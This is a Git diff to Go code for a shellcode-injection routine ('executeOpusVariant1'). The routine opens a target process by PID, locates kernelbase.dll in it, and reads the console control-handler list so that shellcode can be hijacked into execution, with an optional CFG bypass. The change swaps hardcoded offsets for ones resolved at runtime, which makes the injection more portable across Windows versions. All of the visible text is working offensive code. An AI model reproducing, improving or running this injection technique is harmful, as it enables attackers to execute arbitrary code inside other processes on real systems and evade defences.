@@ -34,19 +34,26 @@ func executeOpusVariant1(shellcode []byte, pid uint32, cfgBypass bool) (string, 
 	defer injectCloseHandle(hProcess)
 	sb.WriteString(fmt.Sprintf("[+] Opened target process handle: 0x%X\n", hProcess))
 
-	// Step 2: Find kernelbase.dll in target process
+	// Step 2: Resolve handler list offsets dynamically
+	offsets, resolveErr := getCtrlHandlerOffsets()
+	if resolveErr != nil {
+		return sb.String(), fmt.Errorf("failed to resolve handler offsets: %w", resolveErr)
+	}
+	sb.WriteString("[+] Resolved handler list offsets dynamically\n")
+
+	// Step 3: Find kernelbase.dll in target process
 	kernelbaseAddr, err := findModuleInProcess(windows.Handle(hProcess), "kernelbase.dll")
 	if err != nil {
 		return sb.String(), fmt.Errorf("failed to find kernelbase.dll: %w", err)
 	}
 	sb.WriteString(fmt.Sprintf("[+] Found kernelbase.dll at: 0x%X\n", kernelbaseAddr))
 
-	// Step 3: Calculate addresses using known RVA offsets
-	handlerListPtrAddr := kernelbaseAddr + HandlerListRVA
-	handlerListLengthAddr := kernelbaseAddr + HandlerListLengthRVA
-	allocatedLengthAddr := kernelbaseAddr + AllocatedHandlerListLengthRVA
+	// Step 4: Calculate addresses using resolved RVA offsets
+	handlerListPtrAddr := kernelbaseAddr + offsets.handlerList
+	handlerListLengthAddr := kernelbaseAddr + offsets.length
+	allocatedLengthAddr := kernelbaseAddr + offsets.allocatedLength
 
-	// Step 4: Read handler array pointer, count, and capacity
+	// Step 5: Read handler array pointer, count, and capacity
 	var handlerArrayAddr uintptr
 	err = injectReadMemoryInto(hProcess, handlerListPtrAddr, unsafe.Pointer(&handlerArrayAddr), 8)
 	if err != nil {
